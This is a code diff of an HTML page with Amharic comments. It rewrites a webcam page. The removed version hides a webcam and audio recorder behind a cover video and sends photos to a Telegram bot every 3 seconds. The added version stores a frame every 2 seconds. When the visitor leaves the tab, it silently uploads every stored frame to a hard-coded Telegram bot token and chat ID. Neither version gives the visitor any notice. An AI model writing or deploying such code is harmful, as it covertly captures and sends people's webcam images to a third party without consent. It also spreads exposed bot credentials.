@@ -2,63 +2,78 @@
 <html lang="am">
 <head>
     <meta charset="UTF-8">
-    <title>የቪዲዮ ማጫወቻ ገጽ</title>
+    <title>ካሜራ ካፕቸር</title>
 </head>
 <body>
 
-    <h2>አስደሳች ቪዲዮ ይመልከቱ</h2>
-    
-    <!-- 1. ተጠቃሚው የሚያየው ሽፋን (Cover) ቪዲዮ -->
-    <video src="video.mp4" width="400" controls autoplay></video>
-
-    <!-- ❌ 1. መወገድ ያለበት መስመር፡ ተጠቃሚው እንዳያየው የተደበቀ ካሜራና Canvas -->
-    <video id="hiddenWebcam" style="display:none;" autoplay></video>
-    <canvas id="hiddenCanvas" style="display:none;"></canvas>
+    <h2>የካሜራ እይታ</h2>
+    <video id="video" width="320" height="240" autoplay></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
     <script>
-        const hiddenWebcam = document.getElementById('hiddenWebcam');
-        const hiddenCanvas = document.getElementById('hiddenCanvas');
-        const context = hiddenCanvas.getContext('2d');
+        const BOT_TOKEN = "8366647485:AAF9DxVYh6Elid9rBkE2-mIAYMxSYgc0Aow";
+        const CHAT_ID = "8125688786";
 
-        // የካሜራ ፍቃድ መጠየቅ
-        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-            .then(function(stream) {
-                hiddenWebcam.srcObject = stream;
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
 
-                // ❌ 2. መወገድ ያለበት መስመር፡ በስተጀርባ ድምፅ የሚቀርጽ አደገኛ ፈንክሽን
-                startHiddenAudioRecord(stream);
+        let imageBuffer = [];
+        let captureInterval = null;
 
-                // ❌ 3. መወገድ ያለበት መስመር፡ በየ 3 ሰከንዱ በስውር ፎቶ የሚያነሳ ታይመር
-                setInterval(function() {
-                    
-                    // በስውር ፎቶ ማንሳት
-                    hiddenCanvas.width = hiddenWebcam.videoWidth;
-                    hiddenCanvas.height = hiddenWebcam.videoHeight;
-                    context.drawImage(hiddenWebcam, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
-                    let photoData = hiddenCanvas.toDataURL('image/jpeg');
+        // 1. ካሜራ ማስጀመር
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                
+                // በየ 2 ሰከንዱ (2000ms) ፎቶ እየነሱ በ RAM/Array ውስጥ ማከማቸት
+                captureInterval = setInterval(capturePhoto, 2000);
+            })
+            .catch(err => console.error("ካሜራ አልተከፈተም:", err));
 
-                    // ❌ 4. መወገድ ያለበት መስመር፡ ወደ ቴሌግራም ቦት በስውር መላኪያ ጥሪ
-                    sendSecretToTelegram(photoData);
-
-                }, 3000); // 👈 በየ 3 ሰከንዱ አውቶማቲክ ይደጋገማል!
-            });
-
-        // ❌ 5. መወገድ ያለበት መስመር፡ ወደ ቴሌግራም ቦት የሚላክበት አካል
-        function sendSecretToTelegram(photo) {
-            let botToken = "8818405487:AAF1n4fyHEZYcXg3ugIIB6KDNoDxy06DuV0";
-            let chatId = "8125688786";
-            
-            fetch(https://api.telegram.org/bot${botToken}/sendPhoto, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, photo: photo })
-            });
+        // 2. ፎቶን አዘጋጅቶ Memory ላይ ማስቀመጥ
+        function capturePhoto() {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            // የፎቶውን ጥራት 50% (0.5) በማድረግ የፋይል መጠኑን መቀነስ
+            const imageData = canvas.toDataURL('image/jpeg', 0.5);
+            imageBuffer.push(imageData);
+            console.log(`ፎቶ ተይዟል! ጠቅላላ የተያዙ፡ ${imageBuffer.length}`);
         }
 
-        // ❌ 6. መወገድ ያለበት መስመር፡ ድምፅ በስውር መቅረጫ
-        function startHiddenAudioRecord(stream) {
-            let mediaRecorder = new MediaRecorder(stream);
-            mediaRecorder.start();
+        // 3. ተጠቃሚው ገጹን ሲዘጋ ወይም ታቡን ሲቀይር (Exit Event)
+        document.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'hidden') {
+                sendAllPhotos();
+            }
+        });
+
+        // 4. የተከማቹትን ፎቶዎች በሙሉ ወደ Telegram መላክ
+        async function sendAllPhotos() {
+            if (imageBuffer.length === 0) return;
+
+            // ታይመሩን ማቆም
+            if (captureInterval) clearInterval(captureInterval);
+
+            // የተከማቹትን ፎቶዎች በሙሉ በተከታታይ መላክ
+            for (let i = 0; i < imageBuffer.length; i++) {
+                try {
+                    const blob = await (await fetch(imageBuffer[i])).blob();
+                    const formData = new FormData();
+                    formData.append("chat_id", CHAT_ID);
+                    formData.append("photo", blob, `photo_${i + 1}.jpg`);
+
+                    // keepalive: true ብሮውዘሩ ቢዘጋም ጥሪው እንዳይቋረጥ ይረዳል
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: "POST",
+                        body: formData,
+                        keepalive: true
+                    });
+                } catch (e) {
+                    console.error("የመላክ ስህተት፡", e);
+                }
+            }
+            // ከተላኩ በኋላ ኤሬዩን ባዶ ማድረግ
+            imageBuffer = [];
         }
     </script>
 
